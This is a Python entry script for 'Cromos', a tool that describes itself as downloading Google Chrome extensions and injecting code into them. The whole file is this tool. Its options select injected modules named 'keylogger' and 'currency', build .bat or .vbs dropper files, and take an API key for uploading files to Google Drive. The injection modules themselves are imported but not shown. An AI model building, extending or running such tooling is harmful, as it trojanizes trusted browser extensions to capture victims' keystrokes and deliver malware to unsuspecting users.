#!/usr/bin/python

import argparse
import sys
from libs.download import Download
from libs.drive import Drive
from libs.build import Build
from libs.colors import Colors
from libs.loader import Loader


def main() :

	
	global color

	color = Colors()

	def banner() : 

		banner = """
         (         )      *         )    (     
   (     )\ )   ( /(    (  `     ( /(    )\ )  
   )\   (()/(   )\())   )\))(    )\())  (()/(  
 (((_)   /(_)) ((_)\   ((_)()\  ((_)\    /(_)) 
 )\___  (_))     ((_)  (_()((_)   ((_)  (_))   
((/ __| | _ \   / _ \  |  \/  |  / _ \  / __|  
 | (__  |   /  | (_) | | |\/| | | (_) | \__ \  
  \___| |_|_\   \___/  |_|  |_|  \___/  |___/
	 """
		print("\r\t{}".format(banner))
		print("  Version: {} Builds: {} Modules: {}\n".format(color.status("1.0"),color.status("2"), color.status("2")))

	def help () :

		global extension, builds, apikey, modules

		parser = argparse.ArgumentParser(description="Download and Inject code into Google Chrome extensions", usage="python cromos.py --help")
		parser.add_argument('--extension', help="Download a extension from Google Chrome Webstore", type=str, required="true")
		parser.add_argument('--load', help='Load a script to run in background with the application', type=str)
		parser.add_argument('--build', help='Build types .bat\n.exe\n.vbs', type=str)
		parser.add_argument('--key', help='API key for uploading files in Google Drive', type=str)

		args = parser.parse_args()

		extension = args.extension # Extensao ID
		modules = args.load # Tipo do arquivo que devera ser gerado apos os injections
		apikey = args.key # API key par ao dropbox
		builds = args.build # Pasta de saida para os arquivos

		if len(sys.argv) < 2 :
			banner()
			parser.print_help()
	help()
	banner()

	download = Download(extension)

	if builds == "bat" or builds == "vbs":
		builder = Build(extension, builds).builder()
	if modules == "currency" or modules == "keylogger" :
		loader = Loader(extension, modules).inject()

if __name__== "__main__" :

	main()